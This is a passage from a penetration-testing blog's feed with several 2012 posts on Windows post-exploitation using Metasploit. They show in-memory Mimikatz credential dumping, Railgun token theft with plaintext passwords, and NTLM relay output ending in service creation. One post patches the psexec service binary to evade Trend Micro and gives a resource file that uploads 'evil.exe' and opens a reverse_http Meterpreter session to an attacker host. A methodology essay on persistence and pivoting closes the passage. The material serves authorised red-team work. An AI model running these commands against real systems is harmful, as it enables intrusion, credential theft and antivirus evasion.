&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/screen20shot202012-10-1720at2011-01-2320am.png.23%20AM.png&#34; alt=&#34;Screen Shot 2012 10 17 at 11 01 23 AM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Mosy on over  to the Socks4a module. And in another terminal we need to make sure our proxychains.conf file in /etc/ or where ever you store your conf is correct. &lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/screen20shot202012-10-1720at2010-52-2920am.png.29%20AM.png&#34; alt=&#34;Screen Shot 2012 10 17 at 10 52 29 AM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;It defaults to 9050 on 127.0.01 for Tor, that&amp;rsquo;s pretty easy to cope with and no reason to mess with it if you actually use it for Tor for other things.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/screen20shot202012-10-1720at2011-03-0020am.png.00%20AM.png&#34; alt=&#34;Screen Shot 2012 10 17 at 11 03 00 AM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Run the socks proxy with the Tor-like settings. (Remember to shutdown Tor first)&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/screen20shot202012-10-1720at2011-04-3420am.png.34%20AM.png&#34; alt=&#34;Screen Shot 2012 10 17 at 11 04 34 AM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;And the rest is gravy. The % (percent sign if blog software mangles it) is a delimiter that smbclient and other samba tools recognize between user and password (so it doesn&amp;rsquo;t prompt you for it).&lt;/p&gt;

&lt;p&gt;And just to love it working:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/10/screen20shot202012-10-1720at2011-04-5320am.png.53%20AM.png&#34; alt=&#34;Screen Shot 2012 10 17 at 11 04 53 AM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;yay files.. Yes I know I didn&amp;rsquo;t use smbmount but it works the same as well as rpcclient.&lt;/p&gt;

&lt;p&gt;A side note here is if you are using the pth-tools from:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://code.google.com/p/passing-the-hash/&#34;&gt;https://code.google.com/p/passing-the-hash/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;You can use hashes instead of passwords for stuff like this. But who are we kidding? Who doesn&amp;rsquo;t get clear text passwords anymore ;-)&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Completely In-memory Mimikatz with Metasploit</title>
      <link>http://localhost:1313/post/2012/201296completely-in-memory-mimikatz-with-metasploit-html/</link>
      <pubDate>Thu, 06 Sep 2012 03:16:47 +0000</pubDate>
      
      <guid>http://localhost:1313/post/2012/201296completely-in-memory-mimikatz-with-metasploit-html/</guid>
      <description>&lt;p&gt;Executing WCE.exe in memory as demoed by Egypt here: &lt;a href=&#34;https://community.rapid7.com/community/metasploit/blog/2012/05/08/eternal-sunshine-of-the-spotless-ram&#34;&gt;https://community.rapid7.com/community/metasploit/blog/2012/05/08/eternal-sunshine-of-the-spotless-ram&lt;/a&gt; has two issues with it. 1, you leave a file on disk with your hashes and clear text passwords. That just won&amp;rsquo;t do. 2. There is this DLL called WCEAUX.dll that gets written for the briefest second to disk:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/09/screen20shot202012-09-0520at2010-48-5720pm.png.57%20PM.png&#34; alt=&#34;Screen Shot 2012 09 05 at 10 48 57 PM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;(yes I realize I&amp;rsquo;m running this on disk &amp;lsquo;wce32.exe&amp;rsquo;, but it exhibits the same DLL drop when doing in-memory)&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Now, don&amp;rsquo;t get me wrong, I love WCE, and Hernan Ochoa does an amazing job with it, but when it comes down to it, it&amp;rsquo;s the best tool for the job. And today, that&amp;rsquo;s now Mimikatz. &lt;/p&gt;

&lt;p&gt;Just like WCE to execute it in memory you use the -m flag for execute:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;execute -H -i -c -m -d calc.exe -f mimikatz.exe -a &amp;lsquo;&amp;ldquo;sekurlsa::logonPasswords full&amp;rdquo; exit&amp;rsquo;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;For mimikatz to automatically send commands require double quotes in the command line arguments, so we use single quotes in meterpreter to encircle the execute arguments (-a). Running first &amp;ldquo;sekurlsa::logonPasswords full&amp;rdquo; then &amp;lsquo;exit&amp;rsquo; to auto-exit mimikatz console. Like so:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/09/screen20shot202012-09-0520at2010-57-4520pm.png.45%20PM.png&#34; alt=&#34;Screen Shot 2012 09 05 at 10 57 45 PM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;And all you get forensically is calc.exe loading a ton of DLLs it has no business loading but no new files touch disk ;-)&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/09/screen20shot202012-09-0520at2011-07-3520pm.png.35%20PM.png&#34; alt=&#34;Screen Shot 2012 09 05 at 11 07 35 PM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;The downloads for Mimikatz are were they always are:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://blog.gentilkiwi.com/mimikatz&#34;&gt;http://blog.gentilkiwi.com/mimikatz&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Oh, did I mention that Mimikatz is open source and the in-memory goodness has been uploaded to svn:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://code.google.com/p/mimikatz/&#34;&gt;https://code.google.com/p/mimikatz/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Awesome work @&lt;a href=&#34;http://twitter.com/gentilkiwi&#34;&gt;gentilkiwi&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;If you want to check out the the fix that was implemented to work with Meterpreter&amp;rsquo;s in-memory goodness check here:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://code.google.com/p/mimikatz/source/detail?r=33&#34;&gt;https://code.google.com/p/mimikatz/source/detail?r=33&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Raising Zombies in Windows: Part 1 - Passwords</title>
      <link>http://localhost:1313/post/2012/2012731raising-zombies-in-windows-part-1-passwords-html/</link>
      <pubDate>Tue, 31 Jul 2012 20:20:15 +0000</pubDate>
      
      <guid>http://localhost:1313/post/2012/2012731raising-zombies-in-windows-part-1-passwords-html/</guid>
      <description>&lt;p&gt;With the use of Mimikatz and WCE, clear text passwords are much more common. What isn&amp;rsquo;t always there is the user. They take lunches, go home at a reasonable time and generally aren&amp;rsquo;t really appreciative of our (pentester/red teamer)&amp;rsquo;s schedule.&lt;/p&gt;

&lt;p&gt;A straight forward way, and provided by Microsoft to create a process as a user (whereby having their token readily available is using &amp;lsquo;runas.exe&amp;rsquo;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/07/screen20shot202012-07-3120at204-04-4120pm.png.41%20PM.png&#34; alt=&#34;Screen Shot 2012 07 31 at 4 04 41 PM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;w00t, we the user is present, we can migrate our meterepreter session into that notepad and we&amp;rsquo;re good right? Problem there is you have to interactively input the password, so without a real cmd.exe or RDP session of your own, (VNC payload would work), you&amp;rsquo;re generally SOL.&lt;/p&gt;

&lt;p&gt;There are a ton of posted ways around this, most involve make a wrapper script to input the password for you such as this one:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/07/screen20shot202012-07-3120at203-24-1120pm.png.11%20PM.png&#34; alt=&#34;Screen Shot 2012 07 31 at 3 24 11 PM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;(this was pretty unique as it actually sent the keys to the key buffer instead of directly to STDIN)&lt;/p&gt;

&lt;p&gt;Another way if you don&amp;rsquo;t mind dropping / creating a custom bin, AutoIT makes this REALLY simple:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/07/screen20shot202012-07-3120at203-57-4220pm.png.42%20PM.png&#34; alt=&#34;Screen Shot 2012 07 31 at 3 57 42 PM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;This could be 2 lines if you really wanted it to be but I like to make things a bit more universal. You could also execute this directly in memory with meterepreter&amp;rsquo;s execute command with the &amp;ldquo;-m&amp;rdquo; argument after you&amp;rsquo;ve built the AutoIT script into a EXE.&lt;/p&gt;

&lt;p&gt;But what go through all that trouble? Railgun can do this just as easily. Drop to IRB or create a script that does the following:&lt;/p&gt;

&lt;p&gt;a = client.railgun.kernel32.GetStartupInfoW(56)[&amp;ldquo;lpStartupInfo&amp;rdquo;]&lt;/p&gt;

&lt;p&gt;client.railgun.advapi32.CreateProcessWithLogonW(&amp;ldquo;USER&amp;rdquo;,&amp;ldquo;DOMAIN&amp;rdquo;,&amp;ldquo;PASSWORD&amp;rdquo;,&amp;ldquo;LOGON_WITH_PROFILE&amp;rdquo;,&amp;ldquo;notepad.exe&amp;rdquo;,nil,0,nil,nil,a,32)&lt;/p&gt;

&lt;p&gt;This will create a notepad.exe process with the defined user. But we can go a bit more stealthy, since we really only need their account token we can just user LogonUser:&lt;/p&gt;

&lt;p&gt;client.railgun.advapi32.LogonUserA(&amp;ldquo;USER&amp;rdquo;,&amp;ldquo;DOMAIN&amp;rdquo;,&amp;ldquo;PASSWORD&amp;rdquo;,&amp;ldquo;LOGON32_LOGON_INTERACTIVE&amp;rdquo;,&amp;ldquo;LOGON32_PROVIDER_DEFAULT&amp;rdquo;,4)&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;List the tokens available with Incognito, your new user will be there, steal it and you&amp;rsquo;re done. You now have the ability to user that account/domain token on any of the hosts you&amp;rsquo;ve compromised on the network, not just the ones they happen to have left themselves logged in. This gets really fun on servers where the admin hasn&amp;rsquo;t logged in but you wanna grab all of their IE saved passwords ;-)&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Cross-Protocol Chained Pass the Hash for Metasploit</title>
      <link>http://localhost:1313/post/2012/2012710cross-protocol-chained-pass-the-hash-for-metasploit-html/</link>
      <pubDate>Tue, 10 Jul 2012 06:02:40 +0000</pubDate>
      
      <guid>http://localhost:1313/post/2012/2012710cross-protocol-chained-pass-the-hash-for-metasploit-html/</guid>
      <description>&lt;p&gt;Every so often someone writes a Metasploit Module that is pretty epic. Today is one such day:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/07/screen20shot202012-07-1020at201-53-1520am.png.15%20AM.png&#34; alt=&#34;Screen Shot 2012 07 10 at 1 53 15 AM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Twitter Link: &lt;a href=&#34;https://twitter.com/webstersprodigy/status/222529916783169536&#34;&gt;https://twitter.com/webstersprodigy/status/222529916783169536&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Which has a link to here: &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/pull/589&#34;&gt;https://github.com/rapid7/metasploit-framework/pull/589&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Demo / Example resource files: &lt;a href=&#34;https://skydrive.live.com/?cid=19794fac33285fd5&amp;amp;resid=19794FAC33285FD5!170&amp;amp;id=19794FAC33285FD5%21170&#34;&gt;https://skydrive.live.com/?cid=19794fac33285fd5&amp;amp;resid=19794FAC33285FD5!170&amp;amp;id=19794FAC33285FD5%21170&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;You can pull the fork w/ branch from here: &lt;a href=&#34;https://github.com/webstersprodigy/metasploit-framework/tree/module-http-ntlmrelay&#34;&gt;https://github.com/webstersprodigy/metasploit-framework/tree/module-http-ntlmrelay&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;And as soon as you do you can start doing this (&lt;strong&gt;&lt;em&gt;using the example resource file to put a file, cat it out, enum shares available, list files on a share, then psexec all from a single URL being loaded&lt;/em&gt;&lt;/strong&gt;):&lt;/p&gt;

&lt;p&gt;163 address is the Victim I tricked into loading a URL and 182 is the system I want to get onto. This is an HTTP request resulting in a SMB Relay&amp;rsquo;d auth. It looks as though multiple targets can be used as relay targets but I haven&amp;rsquo;t tested this out yet.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[*] 172.16.10.163 http_ntlmrelay - NTLM Request &#39;/smb_put&#39; from 172.16.10.163:52327&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay...&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] 172.16.10.163 http_ntlmrelay - File \172.16.10.182c$secret.txt written&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] 172.16.10.163 http_ntlmrelay - NTLM Request &#39;/smb_get&#39; from 172.16.10.163:52328&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay...&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] 172.16.10.163 http_ntlmrelay - Reading 13 bytes from 172.16.10.182&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] 172.16.10.163 http_ntlmrelay - ----Contents----&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] 172.16.10.163 http_ntlmrelay - hi ima secret&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] 172.16.10.163 http_ntlmrelay - ----End Contents----&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] 172.16.10.163 http_ntlmrelay - NTLM Request &#39;/smb_enum&#39; from 172.16.10.163:52329&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay...&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] 172.16.10.163 http_ntlmrelay - Shares enumerated 172.16.10.182 IPC$ADMIN$C$&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] 172.16.10.163 http_ntlmrelay - NTLM Request &#39;/smb_ls&#39; from 172.16.10.163:52330&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay...&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] 172.16.10.163 http_ntlmrelay - Listed 13 files from 172.16.10.182c$&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] 172.16.10.163 http_ntlmrelay - .rnd&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] 172.16.10.163 http_ntlmrelay - PerfLogs&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] 172.16.10.163 http_ntlmrelay - config.sys&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] 172.16.10.163 http_ntlmrelay - inetpub&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] 172.16.10.163 http_ntlmrelay - xampp&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] 172.16.10.163 http_ntlmrelay - ProgramData&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] 172.16.10.163 http_ntlmrelay - MSOCache&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] 172.16.10.163 http_ntlmrelay - secret.txt&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] 172.16.10.163 http_ntlmrelay - autoexec.bat&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] 172.16.10.163 http_ntlmrelay - Windows&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] 172.16.10.163 http_ntlmrelay - Users&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] 172.16.10.163 http_ntlmrelay - Program Files&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] 172.16.10.163 http_ntlmrelay - NTLM Request &#39;/smb_rm&#39; from 172.16.10.163:52332&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay...&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] 172.16.10.163 http_ntlmrelay - File \172.16.10.182c$secret.txt deleted&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] 172.16.10.163 http_ntlmrelay - NTLM Request &#39;/smb_pwn&#39; from 172.16.10.163:52333&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] 172.16.10.163 http_ntlmrelay - Beginning NTLM Relay...&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] 172.16.10.163 http_ntlmrelay - SMB auth relay succeeded&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] 172.16.10.163 http_ntlmrelay - Obtraining a service manager handle...&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] 172.16.10.163 http_ntlmrelay - Creating a new service&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] 172.16.10.163 http_ntlmrelay - Closing service handle...&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] 172.16.10.163 http_ntlmrelay - Opening service...&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;[*] 172.16.10.163 http_ntlmrelay - Starting the service...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Let the fun begin&amp;hellip;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Bypassing Trend Micro&#39;s Service Protection</title>
      <link>http://localhost:1313/post/2012/201275bypassing-trend-micros-service-protection-html/</link>
      <pubDate>Thu, 05 Jul 2012 03:44:59 +0000</pubDate>
      
      <guid>http://localhost:1313/post/2012/201275bypassing-trend-micros-service-protection-html/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;http://twitter.com/jabjorkhaug&#34;&gt;@jabjorkhaug&lt;/a&gt; posed the following question on Twitter today:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/07/screen20shot202012-07-0420at203-55-0820pm.png.08%20PM.png&#34; alt=&#34;Screen Shot 2012 07 04 at 3 55 08 PM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;I figured I could solve this and it would be an interesting challenge. Here is what it gets detected as:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/07/screen20shot202012-07-0420at204-03-1420pm.png.14%20PM.png&#34; alt=&#34;Screen Shot 2012 07 04 at 4 03 14 PM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;The service binary that is used as part of PSEXEC is located here:&lt;/p&gt;

&lt;p&gt;MSF Directory/data/templates/src/pe/exe/service/service.c&lt;/p&gt;

&lt;p&gt;The important part to look at starts at line 57:&lt;/p&gt;

&lt;p&gt;if( CreateProcess( NULL, &amp;ldquo;rundll32.exe&amp;rdquo;, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;amp;si, &amp;amp;pi ) )&lt;/p&gt;

&lt;p&gt;{&lt;/p&gt;

&lt;p&gt;Context.ContextFlags = CONTEXT_FULL;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;GetThreadContext( pi.hThread, &amp;amp;Context );&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;lpPayload = VirtualAllocEx( pi.hProcess, NULL, PAYLOAD_SIZE, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE );&lt;/p&gt;

&lt;p&gt;if( lpPayload )&lt;/p&gt;

&lt;p&gt;{&lt;/p&gt;

&lt;p&gt;WriteProcessMemory( pi.hProcess, lpPayload, &amp;amp;bPayload, PAYLOAD_SIZE, NULL );&lt;/p&gt;

&lt;p&gt;#ifdef _WIN64&lt;/p&gt;

&lt;p&gt;Context.Rip = (DWORD64)lpPayload;&lt;/p&gt;

&lt;p&gt;#else&lt;/p&gt;

&lt;p&gt;Context.Eip = (DWORD)lpPayload;&lt;/p&gt;

&lt;p&gt;#endif&lt;/p&gt;

&lt;p&gt;SetThreadContext( pi.hThread, &amp;amp;Context );&lt;/p&gt;

&lt;p&gt;}&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;ResumeThread( pi.hThread );&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;CloseHandle( pi.hThread );&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;CloseHandle( pi.hProcess );&lt;/p&gt;

&lt;p&gt;}&lt;/p&gt;

&lt;p&gt;It&amp;rsquo;s injecting our payload into the service binary and tossing our payload into &amp;ldquo;rundll32.exe&amp;rdquo; at run time on the victim (side note: you can change which bin it goes into ;). Lets change this so it doesn&amp;rsquo;t do any injection and just executes a binary. That removes the &amp;lsquo;injection&amp;rsquo; piece and hopefully lets us get our shell. We are loosing a bit of stealth because instead of just one (the service binary) we are writing two binaries.&lt;/p&gt;

&lt;p&gt;To make this change you replace the above with just this:&lt;/p&gt;

&lt;p&gt;if( CreateProcess( NULL, &amp;ldquo;C:\evil.exe&amp;rdquo;, NULL, NULL, FALSE, DETACHED_PROCESS, NULL, NULL, &amp;amp;si, &amp;amp;pi ) )&lt;/p&gt;

&lt;p&gt;{&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;CloseHandle( pi.hProcess );&lt;/p&gt;

&lt;p&gt;}&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;Compiling this on OSX using mingw is very easy and is very similar on Ubuntu if you have mingw installed:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;i386-mingw32-gcc -o service.exe service.c &lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Then just copy it to replace the current one:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;cp service.exe ../../../../template_x86_windows_svc.exe &lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;No other changes are needed. Only problem is, how do we get the &amp;ldquo;evil.exe&amp;rdquo; up onto the box for it to execute? That&amp;rsquo;s where the auxiliary module &amp;ldquo;auxiliary/admin/smb/upload&lt;em&gt;file&amp;rdquo; comes in :-) I built a resource file to demo the timeline of getting execution with this new service binary (broken up with comments to explain, _remove the comments for it to work&lt;/em&gt;):&lt;/p&gt;

&lt;p&gt;#Start Multi Handler&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;use multi/handler&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;set PAYLOAD windows/meterpreter/reverse_http&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;set LHOST 172.16.195.1&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;set LPORT 80&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;set ExitOnSession false&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;exploit -j -z
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;#Upload file to evil.exe on the C$ share (C$ is default for this module so no reason to set it)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;use auxiliary/admin/smb/upload_file&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;set LPATH evil.exe&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;set RPATH evil.exe&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;set RHOST 172.16.195.155&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;set SMBUser Administrator&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;set SMBPass Password1234!&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;run
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;#Execute PSEXEC using the new service binary that simply executes&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;use exploit/windows/smb/psexec&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;set RHOST 172.16.195.155&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;set SMBUser Administrator&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;set SMBPass Password1234!&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;set DisablePayloadHandler true&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;set PAYLOAD windows/meterpreter/reverse_http&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;set LHOST 172.16.195.1&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;set LPORT 80&amp;lt;br&amp;gt;&amp;lt;/br&amp;gt;exploit -j -z
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The passwords could have just as easily been hashes, and the end result is:&lt;/p&gt;

&lt;p&gt;Well I can&amp;rsquo;t really show you that nothing was detected… so I guess you just have to believe me when I say:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[*] Meterpreter session 2 opened (172.16.195.1:80 -&amp;gt; 172.16.195.155:49169) at Wed Jul 04 16:02:23 -0400 2012
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;w00t!&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Presence, Persistence, and Pivoting</title>
      <link>http://localhost:1313/post/2012/2012629presence-persistence-and-pivoting-html/</link>
      <pubDate>Fri, 29 Jun 2012 23:33:56 +0000</pubDate>
      
      <guid>http://localhost:1313/post/2012/2012629presence-persistence-and-pivoting-html/</guid>
      <description>&lt;p&gt;Everyone does things differently, and explaining what goes through an attackers head when they get a shell is virtually impossible and even more so to generalize into a methodology, but I’ve tried to do that with the “3 ‘P’s of Post Exploitation” and they are in a certain order for a reason but certainly up to circumstance to what order is best.&lt;/p&gt;

&lt;p&gt;The first P is &lt;strong&gt;Presence&lt;/strong&gt;. It is first because the attacker needs to get a sense of what he/she has got before they move on. It plays a crucial part in the other two ‘P’s, making them much stealthier or easier. Many times I’ve seen people jump from box to box and totally miss that what they were looking for was on the first one. So “Presence” is all about discovering what you (the attacker) has already. This has many levels and the order of which the attacker checks them and how is arbitrary as well, but they should have at the very least a check list of categories to check on. Here are some to think about:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;File System:&lt;/strong&gt;&lt;br /&gt;
Knowing “where” to look is tough but in each section below we’ll go into known good places to check and ways to search for files and folders with interesting names and extensions&lt;/p&gt;

&lt;p&gt;**OS:&lt;br /&gt;
**Proxy settings, Group Policy settings, login scripts, MOTD, User lists (net user and /etc/passwd). Knowing how the system and attacker has compromised is a crucial piece to understanding how it communicates and works as a piece to the network.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;RAM:&lt;/strong&gt;&lt;br /&gt;
Mostly known for pulling hashes and credentials out of it, there are a lot of other interesting things that reside solely in memory&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Media:&lt;/strong&gt;&lt;br /&gt;
CDs, DVDs, NFS mounts, SMB mounts, USB sticks. These are often bypassed and forgotten during an attack but can hold the keys to the kingdom&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Network:&lt;/strong&gt;&lt;br /&gt;
Routes, ARP entries, netstat are pretty common to check, but broadcast messages, listeners, and IPv6 are less so.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Permissions and Credentials:&lt;/strong&gt;&lt;br /&gt;
This is the obvious one but there is usually a mountain of data as even TinyCore linux has hundreds of files, each with their own permissions. This category extends past the borders of the others but important to single out as a separate step.&lt;br /&gt;
Persistence is achieved at varying levels depending on what the attacker is trying to survive and what the attacker is willing to give up on the stealth side. Staying in memory pretty much kills the attackers chance of surviving a reboot for instance. Tactics to survive a rebuild or revert are also very different. Persistence can also come in the form of simple authentication, if the attacker has a password and it nets him/her code execution or access to the data they are after then that’s all they need. Special focus should be applied to the information gathering section of penetration tests or red team engagements in regards to places that require authentication.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;Pivoting&lt;/strong&gt; simple means extending the attackers current access, and can mean anything from connecting to a remote NFS mount to the attacker PSEXEC-ing their Meterpreter payload onto another box that they have administrative access to. This is the last stage because concentration on the previous two is hard to do in the adrenaline high of initial access.&lt;/p&gt;

&lt;p&gt;Honorable Mention (the mysterious 4th “P”) &lt;strong&gt;Privilege Escalation&lt;/strong&gt; is not part of the Trio because ( then there would be 4 and I wouldn’t know what to call it) while it’s a regular step performed by attackers, it’s something that usually gets too much emphasis. &lt;em&gt;You do not always need Domain Admin access to access the “crown jewels”&lt;/em&gt; .These highly privileged accounts should be assumed to be extremely monitored and coveted. (a.k.a. adding a new user to the Domain Admins group is like lighting your hair on fire and running in the front door of the targets office building screeming “h4x!!”)&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Netstat Post Module for Meterpreter</title>
      <link>http://localhost:1313/post/2012/2012628netstat-post-module-for-meterpreter-html/</link>
      <pubDate>Thu, 28 Jun 2012 13:18:52 +0000</pubDate>
      
      <guid>http://localhost:1313/post/2012/2012628netstat-post-module-for-meterpreter-html/</guid>
      <description>&lt;p&gt;{submitting it to MSF via pull request here: &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/pull/538&#34;&gt;https://github.com/rapid7/metasploit-framework/pull/538&lt;/a&gt; }&lt;/p&gt;

